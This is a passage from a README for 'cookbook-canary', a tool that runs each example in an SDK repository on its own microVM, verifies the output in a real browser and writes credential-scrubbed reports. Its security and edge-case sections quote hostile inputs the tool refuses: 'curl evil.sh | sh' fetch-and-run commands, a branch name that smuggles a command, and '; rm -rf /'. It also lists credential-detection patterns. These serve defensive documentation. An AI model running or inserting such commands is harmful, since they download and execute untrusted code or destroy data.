# cookbook-canary

[![tests](https://github.com/Nitish-1303/cookbook-canary/actions/workflows/test.yml/badge.svg)](https://github.com/Nitish-1303/cookbook-canary/actions/workflows/test.yml)
[![cookbook canary](https://github.com/Nitish-1303/cookbook-canary/actions/workflows/canary.yml/badge.svg)](https://github.com/Nitish-1303/cookbook-canary/actions/workflows/canary.yml)

**Proves every example in a repo still runs — each one alone, on its own
hardware-isolated microVM.** Built on [Solari](https://github.com/solari-sdk):
sandboxes to execute, a cloud browser to check what actually rendered, Linux
desktops for the examples that need pixels.

| | |
| --- | --- |
| Live dashboard | <https://nitish-1303.github.io/cookbook-canary/sample-report.html> |
| Sample artifacts | [`report.md`](docs/sample-report.md) · [`report.json`](docs/sample-report.json) |
| Requires | Node ≥ 22.18 (developed on 24.14.1); a Solari API key for live runs |
| Runtime dependencies | none — the three `@solarisdk/*` packages are optional peers, loaded lazily |
| Size | ~3.0k lines of source, ~2.0k lines of tests, 125 tests, zero `any` |

## Contents

1. [Executive summary](#1-executive-summary)
2. [Architecture and data flow](#2-architecture-and-data-flow)
3. [Deep dive mechanics](#3-deep-dive-mechanics)
4. [Installation and setup](#4-installation-and-setup)
5. [Usage](#5-usage)
6. [CI/CD and automation](#6-cicd-and-automation)
7. [Tests](#7-tests)
8. [Project layout](#8-project-layout)
9. [Project status, limitations, roadmap](#9-project-status-limitations-roadmap)

## 1. Executive summary

### The problem

Example code rots quietly. A transitive dependency ships a breaking minor, an
API changes a default, a `README` drifts from the code beside it — and nothing
turns red, because **examples are not tests**. Nobody runs them. CI compiles the
library and ignores the `examples/` directory entirely.

So the first person to find out is a developer following your quickstart, and
what they learn is that your SDK does not work. That is the most expensive
possible place to discover it: at the top of the funnel, in the five minutes
where a developer decides whether to trust you.

### What it does

`cookbook-canary` runs the examples. Not a linter, not a type check — it clones
the repo, installs each example's real dependencies, executes it on a clean
machine, and then proves the thing actually worked, up to loading the page in a
real browser and reading the rendered text back.

1. **Prepare once.** One sandbox clones the repo, discovers the examples, infers
   how each is built and started, installs every example's dependencies, and
   snapshots the result.
2. **Fan out.** Each example gets its own microVM forked from that snapshot, up
   to `concurrency` at a time. The fork is a sub-second resume of an already
   installed tree.
3. **Prove it.** Exit code, or a stdout regex, or — for anything that serves —
   poll the preview URL until the port answers, then drive a real cloud browser
   at it and assert on the DOM. Failures keep a screenshot and a session replay.
4. **Report.** Markdown for a PR comment, JSON for a dashboard, standalone HTML
   for publishing. All three scrubbed of credentials.

### Core value proposition

An exit code of `0` is a weak claim. "The demo boots but the page is blank" is
the failure users actually hit, and it exits `0` all day. Canary's output is a
stronger claim: *this example, alone, on a clean machine, produced the thing it
promised* — with a screenshot as evidence when it didn't.

The second claim is about trust in the report itself. A canary that cries wolf
at an npm `429` gets muted within a week, and a muted canary is worse than none.
So a non-zero exit is not automatically "your example is broken": verdicts
separate *your code is broken* from *the world was briefly unavailable*, and only
the former breaks the build.

### How this differs from the alternatives

| Approach | Catches | Misses |
| --- | --- | --- |
| Library CI (build + unit tests) | regressions in the library | everything about the examples; they are not compiled, let alone run |
| One container, `for` loop over examples | most runtime breakage | isolation. Example 3 leaves a process on port 3000, example 4 fails, and you debug your harness instead of your SDK |
| Hand-written e2e test per example | in principle, everything | you now maintain N test suites that drift from the N examples they wrap. The tests become the artifact; the example rots anyway |
| Docs link checker / snippet compiler | dead links, syntax errors | whether the code does what the prose says |
| **cookbook-canary** | the example as a user runs it — clean machine, real install, real execution, real browser | nothing that requires reading intent. It cannot tell you an example is *pointless*, only that it is broken |

### What a run looks like

```console
$ canary --repo https://github.com/solari-sdk/solari-cookbook
prep machine sbx_prep up
found 6 example(s) at abcdef123456
installed browser-scrape (18.4s)
installed sandbox-runner (12.1s)
installed stream-chat (9.8s)
install failed: py-agent (12.0s)
snapshot snap_1 — forks start from here
pass sandbox-runner — ok
fail browser-scrape — page did not contain "Scraped 3 pages"
fail py-agent — install: exited 1
flake stream-chat — network or upstream error
retry 1/1 for desktop-tour after: timed out
timeout desktop-tour — timed out
1 passed, 2 failed, 1 timed out, 1 flaky, 1 skipped in 200.0s (6.4 machine-minutes)
reports → ./canary-out
```

Progress goes to stderr, so `--quiet` or a pipe leaves you with just the
artifacts. [`docs/sample-report.md`](docs/sample-report.md) is what the
maintainer actually reads.

## 2. Architecture and data flow

### 2.1 Component map

One rule shapes the whole tree: **exactly one file is allowed to import
`@solarisdk/*`**. Everything above it talks to four interfaces in
[`src/solari/types.ts`](src/solari/types.ts), which is why the orchestrator —
the part most likely to have bugs — is fully testable with no key, no network,
and no billable VMs.

```mermaid
flowchart TB
  subgraph entry["entry points"]
    CLI["cli.ts<br/>argv · env · writes 3 report files"]
    LIB["index.ts<br/>runCanary as a library"]
  end

  subgraph core["orchestration — no SDK imports, 100% unit-tested"]
    CFG["config.ts<br/>parse · validate · defaults"]
    DISC["discover.ts<br/>infer runtime, install, start"]
    RUN["runner.ts<br/>prep · fan-out · retry · budget"]
    CLS["util/classify.ts<br/>verdicts"]
    VER["verify/*<br/>exit · stdout · preview · render"]
    REP["report/*<br/>markdown · json · html"]
  end

  subgraph port["the port — src/solari/types.ts"]
    P["Machine · MachinePool<br/>BrowserProbe · Clock"]
  end

  subgraph adapters["adapters"]
    REAL["solari/real.ts<br/>the only file importing @solarisdk"]
    FAKE["solari/fake.ts<br/>FakePool · FakeMachine · FakeClock"]
  end

  SDK["@solarisdk/sandbox<br/>@solarisdk/desktop<br/>@solarisdk/browser"]

  CLI --> CFG
  CFG --> RUN
  LIB --> RUN
  RUN --> DISC
  RUN --> CLS
  RUN --> VER
  RUN --> REP
  RUN --> P
  P --> REAL
  P --> FAKE
  REAL -.->|"lazy import()"| SDK
```

The payoff is concrete. `real.ts` is 393 lines of mapping and nothing else — no
retry policy, no classification, no reporting. If an SDK method signature drifts,
that is the only file that changes, and the 94 tests covering everything above it
keep passing untouched.

### 2.2 One run, end to end

```mermaid
sequenceDiagram
    autonumber
    participant C as canary
    participant P as prep sandbox
    participant S as snapshot store
    participant F as forked VM, one per example
    participant B as browser session
    participant R as reports

    C->>P: createSandbox, idle window 600s, onTimeout kill
    C->>P: git clone --depth 1 --branch REF
    C->>P: git rev-parse HEAD
    C->>P: find examples -maxdepth 2 -type f
    P-->>C: file listing plus each package.json
    Note over C: discover — runtime, install, start, verify, secrets
    loop each installable example, sequentially
        C->>P: install in examples/NAME
    end
    C->>P: snapshot canary-SHA
    P-->>S: snapshot id
    C->>P: kill — give the quota slot back before fan-out

    loop per example — up to concurrency in flight
        C->>S: createFromSnapshot
        S-->>F: sub-second resume, deps already installed
        alt verify.kind is preview
            C->>F: startBackground the start command
            C->>F: previewUrl(port)
            C->>F: poll until non-425, non-5xx
            C->>B: capture — goto, title, body text, full-page PNG
            B-->>C: rendered text plus screenshot
            C->>F: kill the background process
        else exit or stdout
            C->>F: exec the start command, wait for exit
        end
        C->>F: kill the VM
    end

    C->>B: close — awaited, or the process hangs at exit
    C->>B: getReplayUrl, retried across the upload window
    C->>R: report.md · report.json · index.html
```

Two orderings in there are load-bearing, and both are asserted by tests:

- **The prep machine is killed before fan-out begins.** A snapshot outlives the
  machine that produced it, so holding the prep VM would burn a running-VM quota
  slot — and the plan's quota is the real ceiling on `concurrency`.
- **Replay links are backfilled after `close()`.** A session recording uploads
  asynchronously *after* the session is released, so asking during the run
  reliably 404s. Asking once immediately after close mostly does too, which is
  why it retries.

### 2.3 The snapshot-and-fork mechanism

Isolation per example is the only way a red result means anything. Its cost is
the install: N cold machines means N × `npm install`, which for a cookbook of
thirty examples is most of the wall clock and most of the bill. So the install
happens once.

```
                          ┌──────────────────┐
  prep sandbox            │ browser-scrape   │  ❌ page never said "Scraped 3 pages"
┌──────────────────┐      ├──────────────────┤
│ git clone        │      │ sandbox-runner   │  ✅ exit 0
│ discover         │ ──▶  ├──────────────────┤
│ install all      │      │ py-agent         │  ❌ install: exited 1
│ snapshot         │      ├──────────────────┤
└──────────────────┘      │ stream-chat      │  ⚠️ network error → retried
   killed before          └──────────────────┘
   fan-out begins         ┌──────────────────┐
                          │ desktop-tour     │  ⏱️ desktop VM: stream + screenshot
                          └──────────────────┘
```

Every example therefore starts from a **byte-identical** machine, which is what
makes a failure attributable to the example rather than to whatever ran before
it. The report footer quantifies the saving on every run — *"74.0s of installs
done once instead of 6 times"* — because a design claim with no number attached
is a slogan.

If the pool cannot snapshot, the runner logs that and degrades to sequential runs
inside the prep machine rather than failing the job.

### 2.4 Verdict lifecycle

```mermaid
stateDiagram-v2
    [*] --> Selected
    Selected --> Skipped: deselected by --only, skipped by config, no entrypoint, or a declared secret is absent
    Selected --> Installing: in the prep machine, before any fork exists
    Installing --> Running: install exited 0
    Installing --> Fail: install exited non-zero
    Installing --> Flake: install hit the network or a quota
    Installing --> Skipped: install said a credential was missing
    Running --> Pass: exit 0 and verification satisfied
    Running --> Fail: non-zero exit, or verification unsatisfied
    Running --> Timeout: still running at the deadline
    Running --> Flake: network, 5xx, 429, or quota
    Timeout --> Running: retry, up to retries
    Flake --> Running: retry, up to retries
    Pass --> [*]: exit code 0
    Skipped --> [*]: exit code 0
    Flake --> [*]: exit code 0
    Fail --> [*]: exit code 1
    Timeout --> [*]: exit code 1
```

Note what is *not* in that diagram: an example whose declared secret is missing
never reaches `Installing`. A machine that exists only to print
`SOLARI_API_KEY is not set` is a machine you paid for to learn nothing.

## 3. Deep dive mechanics

### 3.1 Discovery and inference

Discovery runs against the **machine's** filesystem, never the host's — the repo
is cloned inside a microVM and never lands on your disk. One
`find <root> -maxdepth 2 -type f` collects the whole tree in a single round trip
(falling back to `ls -1` per directory if the template has no `find`), and each
`package.json` is read and parsed. The inference itself is a pure function over
that listing, so it is tested against a dozen repo layouts without cloning
anything.

| Signal in the directory | Inferred |
| --- | --- |
| `package.json` present | runtime `node` |
| `requirements.txt`, `pyproject.toml`, or a `*.py` entrypoint | runtime `python` |
| `package-lock.json` present | install `npm ci --no-audit --no-fund` |
| `package.json`, no lockfile | install `npm install --no-audit --no-fund` |
| `requirements.txt` | install `pip install --quiet -r requirements.txt` |
| `pyproject.toml` | install `pip install --quiet .` |
| `scripts.start` in the manifest | start `npm start` |
| else `index.ts`, `main.ts`, `index.js`, `main.js`, `index.mjs`, `main.mjs` | start `node <file>` |
| `main.py`, `app.py`, `run.py`, `example.py` | start `python <file>` |
| name matches `desktop`, `vnc`, `gui`, `computer-use` | routed to a desktop VM |
| `@solarisdk/*` in dependencies | recorded as that example's Solari coverage |
| no start command could be inferred | `skipped`, with the reason spelled out |

Directories beginning with `.` or `_` are ignored. Every inference above is
beaten by an explicit `overrides` entry, and a malformed `package.json` is not
discovery's problem — it is left alone so the install fails with the real parser
error instead of a guess.

### 3.2 Prep, install, and the snapshot

| | |
| --- | --- |
| Prep machine spec | `template`, optional `cpu`/`memMb`, idle window 600 s, `onTimeout: kill` |
| Clone | `git clone --depth 1 --branch <ref> <repo> repo`, 120 s deadline |
| Commit | `git -C repo rev-parse HEAD`, truncated to 12 chars, used in the snapshot label and the report |
| Installs | **sequential**, 600 s deadline each |
| Snapshot label | `canary-<sha>`, or `canary-<ref>` if `rev-parse` failed |

Installs are sequential on purpose: parallel package-manager runs inside one
machine fight over the same cache and turn a clean install failure into a
confusing one. Examples that are skipped, deselected by `--only`, have no
inferrable install, or need a display are not installed here — the first three
because nothing will run them, the last because a desktop VM cannot fork a
headless sandbox's snapshot and has to bootstrap itself anyway.

An install that fails is classified immediately and the example never gets a fork.
That failure is attributed to the example, with the install's stderr tail in the
report, rather than being reported as a broken prep step.

If anything in prep throws, the prep machine is killed in a `catch` before the
error propagates. Nothing above will ever see that machine again, so leaving it
alive would bill until its idle window expired.

### 3.3 Fan-out, machine acquisition, and the cost brake

Machine selection is a four-way decision, in this order:

| Condition | Machine | Owned by the attempt |
| --- | --- | --- |
| `needsDisplay` | `createDesktop`, resolution `1280x800` | yes — killed after |
| a snapshot exists | `createFromSnapshot` | yes — killed after |
| no snapshot, prep machine still alive | the prep machine, reused | **no** — not killed |
| neither | `createSandbox`, cold | yes — killed after |

That `owned` flag matters: in the degraded no-snapshot path the same machine is
shared across sequential examples, and killing it after the first one would break
the rest of the run.

Each example's VM gets an idle window of `example.timeoutMs + 60_000` with
`onTimeout: kill`. The window is deliberately generous because it is **not** the
thing that bounds the run — Solari's `timeoutMs` is a rolling *idle* window, so a
chatty process resets it forever. The real bound is a `withDeadline` race in
Canary's own process, which is what produces a `timeout` verdict.

Cost control is a hard brake, not a warning. `maxMachineMinutes` is seeded with
the clone and install time actually spent, incremented after every attempt
(including each retry), and checked before each new one. Once it is exhausted the
remaining examples are reported `skipped` with the reason
`machine-minute budget (120m) exhausted` — the run still produces a report rather
than dying halfway through.

Fan-out itself is a small bounded pool: results come back in **input order**
regardless of completion order, and a worker that throws is captured as a settled
failure rather than aborting its siblings. One broken example must not cost you
the report for the other thirty-nine.

### 3.4 The four ways an example can be proved

| `verify.kind` | What has to be true | Evidence kept |
| --- | --- | --- |
| `exit` (default) | the process exited `0` | stdout/stderr tails |
| `stdout` | exited `0` **and** stdout matched `expectStdout`, a full regex | tails, plus what was expected |
| `preview` | a server came up on `port`, the preview answered, and a real browser saw every string in `expectText` | title, missing strings, PNG on failure, session replay |
| any, on a desktop | as above, plus a screenshot of the actual screen — **kept even on a pass**, because "it ran" and "it drew the right thing" are different claims | PNG, live stream URL |

The `preview` path is the interesting one, because an example that serves a port
never exits on its own. It is started as a background process, poked from
outside, then stopped — and **a server still running when we stopped it is a
pass**, not exit code 143.

Preview polling has exactly two special statuses, and they mean opposite things:

| Status | Meaning | Action |
| --- | --- | --- |
| `425 Too Early` | the request reached the machine, nothing is listening yet | keep polling — this is the normal first second of an example's life |
| `5xx` | gateway or app not ready | keep polling |
| connection error | machine still coming up | keep polling |
| `401` | token missing, tampered with, or past its hour | **fatal.** Polling cannot fix a bad token; treating it as retryable turns a config mistake into a two-minute hang |
| anything else `< 500` | the port answered | proceed to the browser check |

Defaults are 30 attempts at 1 s. The signed token travels in an
`x-pinetree-preview-token` **header**, not the query string, so it stays out of
the far side's access log — and when the gateway does not sign a preview at all,
the header is omitted rather than sent with an `undefined` value, which the
browser client rejects outright.

Screenshots are kept **only for failures** on the preview path. A green run does
not need thirty base64 PNGs wedged into its artifact.

### 3.5 Classification

The order of these checks *is* the design. Each is tried against the combined
stderr and stdout, and the first match wins:

| Order | Pattern family | Verdict | Retryable | Blocks the build |
| --- | --- | --- | --- | --- |
| 1 | quota, plan limit, concurrent VM limit, insufficient credit | `flake` | yes | no |
| 2 | missing API key / token / credential, `401 unauthorized`, invalid key | `skipped` | no | no |
| 3 | `ECONNRESET`, `ETIMEDOUT`, `ENOTFOUND`, `EAI_AGAIN`, `502/503/504`, `429`, rate limit, TLS handshake, DNS failure | `flake` | yes | no |
| 4 | exit code ≠ 0 | `fail` | no | **yes** |
| 5 | exit 0 but verification unsatisfied | `fail` | no | **yes** |
| 6 | otherwise | `pass` | — | no |

Thrown errors take a parallel path: a `DeadlineExceeded` becomes `timeout`
(retryable, blocking), quota and infrastructure patterns still become `flake`, and
anything else is a `fail` with the message truncated to 120 characters so report
diffs stay readable.

Credentials are checked *before* classification even matters: an example whose
declared secret is absent from the environment is reported `skipped` with the
missing variable named, and no machine is created for it.

| Verdict | Means | Retried | Fails the build |
| --- | --- | --- | --- |
| `pass` | ran and proved it worked | — | no |
| `fail` | exited non-zero, or ran and proved nothing | no | **yes** |
| `timeout` | still running at the deadline | yes | **yes** |
| `flake` | network, upstream 5xx, rate limit, quota | yes | no |
| `skipped` | no credential, no entrypoint, or configured out | no | no |

Retries are granted only to the retryable verdicts, which keeps a genuinely
broken example from costing three machines instead of one.

### 3.6 The reporting pipeline

```
RunSummary ──▶ toArtifact() ──▶ one scrubbed tree ──┬──▶ renderMarkdown() ──▶ report.md
               deep redaction                        ├──▶ JSON.stringify  ──▶ report.json
               schemaVersion: 1                      └──▶ renderHtml()    ──▶ index.html
```

Scrubbing happens **once**, before the fork into three renderers. That ordering
is deliberate: rendering three views of one already-scrubbed tree means a declared
secret cannot reach the published HTML dashboard just because it took a different
code path from the JSON, and it keeps the renderers as pure functions of what they
are handed.

- **`report.md`** — failures first, because nobody scrolls past thirty green rows
  to find the red one. Every failure carries its stderr tail inline in a
  `<details>` block, plus machine id, attempt count, preview status and poll
  count, the exact strings the page was missing, a session replay link, a live
  desktop stream link, and the screenshot as a data URI. Output tails are the last
  4 000 characters, prefixed with `…`.
- **`report.json`** — `{ schemaVersion: 1, generator, summary }`. Versioned
  because people build on artifacts: a dashboard graphing "examples broken over
  time" should be able to tell that the shape changed rather than silently
  mis-reading it.
- **`index.html`** — one standalone file. Inline `<style>`, **no JavaScript**, no
  external assets, every interpolation HTML-escaped, screenshots as data URIs, and
  `prefers-color-scheme: dark` honoured. Safe to publish to Pages or attach to a
  job summary as-is.

### 3.7 Secrets and command safety

Examples for an SDK call that SDK, so this tool has to hand real credentials to
code it does not control and then publish a report about what happened. Those two
facts set the rules:

- Credentials reach the **run** step only — never an install, never a clone. A
  `postinstall` script cannot read the key.
- Only env var **names** live in the config. Values come from the environment and
  are never written to a config file, a log line, or an artifact.
- Every string leaving the process passes a redactor that matches by **shape**, so
  a credential the config never declared is still caught:

  | Label | Shape |
  | --- | --- |
  | `solari-key` | `slr_live_…`, `slr_test_…` |
  | `preview-token` | `pt_token=…` |
  | `preview-header` | `x-pinetree-preview-token: …` |
  | `github-token` | `ghp_…`, `gho_…`, `ghu_…`, `ghs_…`, `ghr_…` |
  | `anthropic-key` | `sk-ant-…` |
  | `openai-key` | `sk-…`, `sk-proj-…` |
  | `aws-key-id` | `AKIA…` |
  | `bearer` | `Bearer <token>` |
  | `url-credentials` | `https://user:pass@host` → `https://[redacted]@host` |

  Known literal values (e.g. the actual `SOLARI_API_KEY`) are redacted too, but
  only if they are at least 6 characters — redacting a 3-character value would
  shred unrelated text and make the report unreadable.

Commands get the same treatment. Solari's `commands.run` takes **argv** and does
not interpret a shell, so `run("npm start && curl evil.sh | sh")` would look for a
binary literally named that. Rather than silently mangling it, every command read
from config or inferred from a manifest is tokenized, and one containing
`| & ; < > $ \` ( ) { } *` outside quotes is **refused** with an error telling you
to write `sh -c "..."` if you meant it. `sh` and `bash` as argv[0] are the
explicit escape hatch.

The one place a shell is unavoidable is desktop `exec`, which takes `args` and
`cwd` but has no `env` field, so env vars are emulated with `sh -lc`. There, every
interpolated value is POSIX single-quoted and every variable *name* is checked
against `^[A-Za-z_][A-Za-z0-9_]*$` — so a value containing `; rm -rf /` is passed
as data, and a hostile name is refused outright.

### 3.8 Edge cases, and what happens

| Situation | Behaviour |
| --- | --- |
| `package.json` is malformed | discovery ignores it; the install fails with the real parser error |
| `find` unavailable in the template | falls back to `ls -1` per directory |
| directory named `.hidden` or `_shared` | not treated as an example |
| `skip: true` with no `reason` | **config rejected** — a silent skip is how examples rot |
| a config has five mistakes | all five are reported at once, before any machine is created |
| preview is unsigned (no token) | header omitted entirely, not sent as `undefined` |
| preview returns `401` | fatal immediately, not retried |
| the example's server is still listening at the end | `pass`, not exit 143 |
| clone fails during prep | prep machine killed in a `catch`, error propagates with the stderr tail |
| clone fails inside a desktop VM | `fail` with a clear reason; the VM is still killed in `finally` |

| no example needs a browser | no browser session is ever launched, so none is billed |
| a session replay has not uploaded yet | 3 asks over ~2.4 s, then a quiet give-up — a missing replay link must never fail a run |
| a worker throws unexpectedly | captured per item; the other examples finish and the report is still written |
| the pool cannot snapshot | logged, then sequential runs inside the prep machine |
| `maxMachineMinutes` runs out mid-fan-out | the rest are `skipped` with that reason; the report is still produced |
| a declared secret is missing | `skipped` before any machine is created |
| an example prints 2 MB of logs | last 4 000 characters, prefixed with `…` |
| `--ref 'main; curl evil.sh \| sh'` | refused by the command parser before it reaches a machine |
| `@solarisdk/desktop` not installed and no desktop examples | never imported, never needed |
| `@solarisdk/desktop` not installed but an example needs it | one clear error naming the package and the `npm i` command, with the original failure as `cause` |

## 4. Installation and setup

### 4.1 Local setup

```bash
git clone https://github.com/Nitish-1303/cookbook-canary.git
```

```bash
cd cookbook-canary && npm ci
```

Node ≥ 22.18 is required (developed on 24.14.1). Canary runs its TypeScript
sources directly via native type stripping, so **there is no build step** — `npm ci`
installs two devDependencies (`typescript`, `@types/node`) and nothing else.

Verify the install without touching the network or an API key:

```bash
npm test && npm run typecheck
```

### 4.2 Check a config with no credentials

```bash
node src/cli.ts --repo https://github.com/solari-sdk/solari-cookbook --dry-run
```

`--dry-run` resolves and prints the merged config, then stops. Nothing is created,
no key is needed. This is how you catch a typo before spending machine-minutes on
it.

### 4.3 Authentication

| Variable | Required | Purpose |
| --- | --- | --- |
| `SOLARI_API_KEY` | for live runs | authenticates all three clients, **and** is forwarded into each example's run step |
| `SOLARI_BASE_URL` | no | API override; defaults to `https://api.getsolari.com` |
| `SOLARI_REGION` | no | region hint, honoured only by the browser client |

Export it in your shell rather than committing it anywhere:

```bash
export SOLARI_API_KEY=slr_live_xxxxxxxx
```

Missing it is not a crash — the CLI exits `2` with
`SOLARI_API_KEY is not set (use --dry-run to check config without it)`.

### 4.4 Install the SDK peers for a live run

The three `@solarisdk/*` packages are **optional** peer dependencies, so `npm ci`
does not install them and neither does CI. Install the ones your target repo
actually needs:

```bash
npm i @solarisdk/sandbox @solarisdk/browser @solarisdk/desktop
```

`@solarisdk/sandbox` is needed by every run. `@solarisdk/browser` is needed only
if some example uses `verify.kind: "preview"`, and `@solarisdk/desktop` only if
some example needs a display. Each is imported lazily at first use; a missing one
produces a single actionable error rather than a stack trace at startup.

### 4.5 First live run

```bash
node src/cli.ts --repo https://github.com/solari-sdk/solari-cookbook --only sandbox-runner
```

Starting with `--only` and one example keeps the first live run to two machines
and a few machine-minutes.

## 5. Usage

### 5.1 CLI

```
canary [options]

--config <path>      config file (default: ./canary.json)
--repo <url>         git URL to check; overrides the config
--ref <ref>          branch or tag (default: main)
--only <a,b,c>       run just these example directories
--concurrency <n>    machines in flight at once (default: 6)
--out <dir>          where to write reports (default: ./canary-out)
--dry-run            resolve and print the config; create no machines
--quiet              suppress progress lines
-h, --help           this text
```

CLI flags override the config file, which overrides the defaults. Reports are
always written; the exit code is what a CI job branches on:

| Exit code | Meaning |
| --- | --- |
| `0` | nothing blocking failed. Flakes and skips land here |
| `1` | at least one example is `fail` or `timeout` |
| `2` | bad config, missing `SOLARI_API_KEY`, or the run could not start |

Common invocations:

```bash
node src/cli.ts --repo https://github.com/me/my-sdk-examples --concurrency 12
```

```bash
node src/cli.ts --ref release/2.0 --only browser-scrape,cli-agent --out /tmp/canary
```

```bash
node src/cli.ts --quiet && echo "all examples still work"
```

After a run, `--out` contains exactly three files:

```
canary-out/
├── report.md      # paste into a PR or a job summary
├── report.json    # schemaVersion 1, for dashboards
└── index.html     # standalone, publishable as-is
```

### 5.2 Configuration reference

Everything is inferred, so `canary.json` only has to name the repo:

| Key | Type | Default | Valid range |
| --- | --- | --- | --- |
| `repo` | string | *required* | an `https://` or `git@` URL |
| `ref` | string | `"main"` | non-empty |
| `examplesDir` | string | `"examples"` | non-empty |
| `concurrency` | int | `6` | 1–32 |
| `timeoutMs` | int | `240000` | 1 000–3 600 000 |
| `template` | string | `"base"` | non-empty |
| `cpu` | int | SDK default | 1–16 |
| `memMb` | int | SDK default | 2 048–65 536 |
| `retries` | int | `1` | 0–5 |
| `maxMachineMinutes` | int | `120` | 1–10 000 |
| `secrets` | string[] | `["SOLARI_API_KEY"]` | env var **names** |
| `overrides` | object | `{}` | keyed by example directory name |

Per-example overrides beat every inference:

| Key | Type | Purpose |
| --- | --- | --- |
| `skip` | boolean | do not run it. **Requires `reason`** |
| `reason` | string | why it is skipped; printed in the report |
| `timeoutMs` | int | per-example deadline, 1 000–3 600 000 |
| `needsDisplay` | boolean | force (or prevent) routing to a desktop VM |
| `install` | string | replace the inferred install command |
| `start` | string | replace the inferred start command |
| `verify` | object | `exit`, `stdout`, or `preview` — see below |
| `secrets` | string[] | env vars this example needs instead of the global list |

```jsonc
{
  "repo": "https://github.com/solari-sdk/solari-cookbook",
  "ref": "main",
  "examplesDir": "examples",
  "concurrency": 6,
  "timeoutMs": 240000,        // per example; a rolling idle window
  "retries": 1,               // retryable verdicts only
  "maxMachineMinutes": 120,   // runaway-cost brake for the whole run
  "secrets": ["SOLARI_API_KEY"],
  "overrides": {
    "browser-scrape": {
      "verify": { "kind": "preview", "port": 3000, "path": "/", "expectText": ["Scraped 3 pages"] }
    },
    "cli-agent": {
      "verify": { "kind": "stdout", "expectStdout": "wrote \\d+ files" }
    },
    "computer-use": { "needsDisplay": true, "timeoutMs": 300000 },
    "billing-demo": { "skip": true, "reason": "needs a paid plan" }
  }
}
```

`verify` is validated structurally: `preview` requires a `port` in 1–65535, and
`stdout` requires an `expectStdout` that compiles as a regular expression. Bad
config throws a `ConfigError` listing **every** problem at once — a canary that
runs for six minutes across thirty microVMs and *then* complains about a typo in
`concurrency` has wasted real money.

### 5.3 As a library

Anything the CLI can do, a script can do:

```ts
import { runCanary, parseConfig, createSolariPool, createBrowserProbe, toJson } from "cookbook-canary";

const config = parseConfig({
  repo: "https://github.com/me/my-sdk-examples",
  concurrency: 8,
  overrides: {
    "web-demo": { verify: { kind: "preview", port: 5173, expectText: ["Hello"] } },
  },
});

const key = process.env.SOLARI_API_KEY!;
const summary = await runCanary(config, {
  machines: createSolariPool({ apiKey: key }),
  // A thunk, not a probe: a repo with no preview checks never opens a browser
  // session, and therefore never pays for one.
  browser: () => createBrowserProbe({ apiKey: key }),
  env: process.env,
  log: (line) => console.error(line),
});

console.log(toJson(summary, [key]));
process.exitCode = summary.exitCode;
```

Every dependency the runner has is injectable, which is also how you test a
pipeline built on top of it — no key, no network, no VMs:

```ts
import { runCanary, parseConfig, FakePool, FakeClock } from "cookbook-canary";

const summary = await runCanary(parseConfig({ repo: "https://github.com/me/examples" }), {
  machines: new FakePool({
    files: { "repo/examples/demo/package.json": '{"scripts":{"start":"node ."}}' },
    handlers: [{ match: /npm start/, respond: { exitCode: 0, stdout: "done" } }],
  }),
  clock: new FakeClock(),
  env: { SOLARI_API_KEY: "slr_test_fake" },
});
```

`FakePool` also lets you provoke the failure modes that are awkward to reach
against the real service: `snapshots: false` forces the sequential fallback,
`previews: false` removes `previewUrl`/`startBackground`, `failCreateAt: 3` throws
on the third machine creation, and a handler can `throws` to simulate a transport
failure or `stayAlive` to model a server that never exits.

## 6. CI/CD and automation

Two workflows, deliberately separate, because one is free and one is not.

| Workflow | Triggers | Cost | Purpose |
| --- | --- | --- | --- |
| [`test.yml`](.github/workflows/test.yml) | every push to `main`, every PR, manual | free | the cheap gate: `npm ci` → `typecheck` → `test` |
| [`canary.yml`](.github/workflows/canary.yml) | 06:15 UTC daily, manual dispatch, PRs touching `examples/**` or `canary.json` | real microVMs | actually runs the examples |

### 6.1 The unit gate

```mermaid
flowchart LR
  A["push / PR"] --> B["npm ci<br/>no SDK peers installed"]
  B --> C["npm run typecheck<br/>tsc --strict"]
  C --> D["npm test<br/>125 tests"]
  D --> E{"green?"}
  E -->|yes| F["merge"]
  E -->|no| G["blocked"]
```

It installs **no** `@solarisdk` peers, on purpose. They are optional, every test
drives the adapter through an injected loader, and a run that needed them present
could go green by quietly skipping the coverage that matters.

### 6.2 The canary

Examples rot from the outside — a dependency ships a breaking minor, an API
changes a default — so this has to run on a clock, not only on push. The daily
schedule is the point; the PR trigger is a bonus for changes that touch the
examples themselves.

Dispatch it manually against any repo:

```bash
gh workflow run canary.yml -f repo=https://github.com/owner/name -f ref=main
```

The reporting pipeline is where the design shows:

1. **No key configured?** Write an explanatory block to the job summary and stop
   — *without* failing. A nightly red X for a missing secret is exactly the alert
   fatigue this tool exists to avoid. Tests and typecheck still run.
2. **Run the canary**, writing into `canary-out/`.
3. **Publish the report** into `$GITHUB_STEP_SUMMARY`.
4. **Comment on the PR** with the same markdown, when the trigger was a PR.
5. **Upload the dashboard** as the `canary-report` artifact.

Steps 3–5 are `if: always()`, gated only on the canary having actually run. A
failed run is exactly the run whose evidence you want, and losing the report
because the job went red is the most annoying possible outcome.

The `concurrency` group cancels an in-flight canary when a newer commit arrives on
the same ref, so a busy PR does not queue up six overlapping runs of thirty VMs
each.

### 6.3 Publishing the dashboard

[`docs/`](docs/) is published to GitHub Pages on every push, which is how
[the sample dashboard](https://nitish-1303.github.io/cookbook-canary/sample-report.html)
stays live. Because `index.html` is fully standalone — inline styles, no scripts,
screenshots as data URIs — publishing a real run is a `cp` away:

```bash
cp canary-out/index.html docs/sample-report.html
```

## 7. Tests

```bash
npm test        # 125 tests, 25 suites
npm run typecheck
```

| File | Covers |
| --- | --- |
| [`test/runner.test.ts`](test/runner.test.ts) | prep, snapshot-and-fork, fan-out, retries, the budget brake, teardown |
| [`test/config.test.ts`](test/config.test.ts) | validation, defaults, every rejected shape |
| [`test/real.test.ts`](test/real.test.ts) | the SDK adapter, mapping by mapping |
| [`test/report.test.ts`](test/report.test.ts) | markdown, JSON schema, HTML escaping, redaction |
| [`test/preview.test.ts`](test/preview.test.ts) | 425/401/5xx polling semantics |
| [`test/util.test.ts`](test/util.test.ts) | classification, command parsing, pool ordering, deadlines |

The whole orchestrator is tested with **no API key, no network, and no billable
VMs**. `FakePool`/`FakeMachine`/`FakeClock` implement the port with scripted
command handlers, a virtual filesystem, an exec log, snapshot bookkeeping, and a
clock that records what it was asked to sleep for. That is what makes it possible
to assert *the prep machine is killed before fan-out begins*, *a hung example
times out and still tears its machine down*, or *the machine-minute brake stops
the run at 1.33 minutes* — in about 1.5 seconds of test time.

Two real bugs came out of writing those orchestrator tests, both of which would
have cost money in production:

- **Preview polling was unmockable.** `verify/http.ts` called the global `fetch`
